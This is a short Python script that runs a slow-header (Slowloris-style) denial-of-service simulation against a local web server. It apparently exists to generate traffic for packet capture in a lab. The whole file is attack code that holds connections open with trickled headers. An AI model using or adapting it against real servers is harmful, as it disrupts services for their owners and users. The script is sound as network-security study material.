#!/usr/bin/env python3
"""
✅ CORRECTED Slowloris-like Attack
- Sends minimal HTTP headers
- Very slow (30 sec between packets)
- Only outgoing traffic → easy to capture
"""

import socket
import time
import sys

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8000
NUM_CONNECTIONS = 20  # Reduce to avoid system overload
DELAY = 30  # Seconds between headers

# Minimal HTTP request (no extra headers)
HTTP_REQ = "GET / HTTP/1.1\r\nHost: localhost\r\n"

def send_slowloris(conn_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((TARGET_HOST, TARGET_PORT))
        print(f"[+] Conn {conn_id}: Connected")
        
        # Send initial request
        sock.send(HTTP_REQ.encode())
        time.sleep(2)
        
        # Send tiny fake headers slowly
        for i in range(5):  # Send 5 headers total
            header = f"X-{i}: a\r\n"
            sock.send(header.encode())
            print(f"    Conn {conn_id}: Sent header {i}")
            time.sleep(DELAY)
            
        sock.close()
        print(f"[✓] Conn {conn_id}: Completed")
    except Exception as e:
        print(f"[-] Conn {conn_id}: {str(e)[:50]}")

if __name__ == "__main__":
    print("🚀 Starting CLEAN Slowloris simulation...")
    print(f"   Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"   Connections: {NUM_CONNECTIONS}")
    print(f"   Delay: {DELAY} seconds\n")
    
    # Start all connections
    for i in range(NUM_CONNECTIONS):
        send_slowloris(i)
        time.sleep(0.5)  # Small gap between connections
    
    print("\n✅ Slowloris finished. Now capture with Wireshark!")